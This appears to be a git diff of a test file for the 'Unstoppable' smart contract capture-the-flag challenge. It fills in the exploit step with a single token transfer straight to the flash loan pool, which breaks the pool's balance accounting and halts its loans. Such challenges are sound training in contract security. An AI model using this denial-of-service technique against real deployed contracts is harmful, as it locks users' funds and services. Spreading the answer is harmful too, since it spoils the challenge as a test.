@@ -38,8 +38,10 @@ describe('[Challenge] Unstoppable', function () {
          await this.receiverContract.executeFlashLoan(10);
     });
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+	it('Exploit', async function () {
+		const anyAmount = 10
+		/** CODE YOUR EXPLOIT HERE */
+		await this.token.connect(attacker).transfer(this.pool.address, anyAmount);
     });
 
     after(async function () {
